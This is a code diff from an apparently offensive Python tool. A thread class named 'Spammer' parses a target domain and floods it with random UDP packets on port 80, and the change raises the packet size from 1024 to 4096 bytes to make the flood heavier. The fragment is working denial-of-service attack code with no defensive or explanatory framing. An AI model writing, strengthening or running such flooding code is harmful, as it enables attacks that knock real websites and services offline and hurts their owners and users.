@@ -8227,7 +8227,6 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			]
 			
 
-
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
@@ -8243,11 +8242,12 @@ class Spammer(threading.Thread):
             target_ip = self.url.split("//")[1].split("/")[0]  # Parse domain from URL
             target_port = 80  # Standard HTTP port
 
-            # Create a raw UDP packet
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            packet = random._urandom(1024)  # Random data packet of 1024 bytes (you can adjust size)
-            
+            # Create a raw UDP packet with a larger size (4096 bytes)
+            packet_size = 4096  # You can adjust this size based on your network capabilities
+            packet = random._urandom(packet_size)  # Random data packet of 4096 bytes
+
             # Send the UDP packet to the target IP and port
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(packet, (target_ip, target_port))
 
             # Print out progress
